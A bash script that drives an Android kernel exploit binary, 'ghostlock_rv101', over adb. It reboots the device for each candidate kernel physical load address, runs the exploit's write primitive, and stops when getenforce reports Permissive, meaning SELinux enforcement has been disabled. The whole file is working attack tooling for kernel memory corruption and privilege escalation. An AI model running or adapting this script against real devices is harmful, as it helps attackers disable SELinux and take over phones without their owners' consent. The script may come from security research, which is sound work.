#!/bin/bash
# scan_kernel_phys_load.sh — scan GL_KERNEL_PHYS_LOAD candidates to find the PA(_text) that
# flips W1 to enforcing.
#
# Usage (WSL):
#   ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"
#   "$ADB" -s <DEVICE_SERIAL> push "$(wslpath -w .../build/ghostlock_rv101)" /data/local/tmp/ghostlock_rv101
#   ./scan_kernel_phys_load.sh 0x80000000 0x80080000 0x80800000 0xa8000000 ...
#
# Per candidate: reboot -> wait 400 s to settle -> --write1 (GL_TAIL_KILLS=34) -> check
# getenforce. On a hit (getenforce=Permissive) stop and print the correct value.
set -u

source "$(dirname "$0")/../deploy/env.sh"   # shared ADB/SERIAL (see deploy/env.sh)
EXPLOIT=/data/local/tmp/ghostlock_rv101

log() { echo "[scan] $*"; }

for cand in "$@"; do
  log "=== 候選 PA = $cand ==="
  "$ADB" -s "$SERIAL" reboot
  # wait for the device to come back + settle
  sleep 60
  for i in $(seq 1 60); do
    if "$ADB" -s "$SERIAL" devices 2>/dev/null | grep -qw device; then break; fi
    sleep 5
  done
  log "settle 340s ..."
  sleep 340
  "$ADB" -s "$SERIAL" shell "chmod 755 $EXPLOIT" 2>/dev/null
  out=$("$ADB" -s "$SERIAL" shell \
    "GL_SKB_PAD=0 GL_DUMMY_KILLS=0 GL_TAIL_KILLS=34 GL_SETUP_ATTEMPTS=6 W1_ATTEMPTS=1 GL_KERNEL_PHYS_LOAD=$cand $EXPLOIT --write1" 2>&1)
  echo "$out" | grep -aE "STRICT|enforce|verified|failed" | tail -5
  enf=$("$ADB" -s "$SERIAL" shell getenforce 2>/dev/null | tr -d '\r\n')
  log "getenforce = $enf"
  if [ "$enf" = "Permissive" ]; then
    log "★★★ 命中！正確 PA(_text) = $cand ★★★"
    break
  fi
done
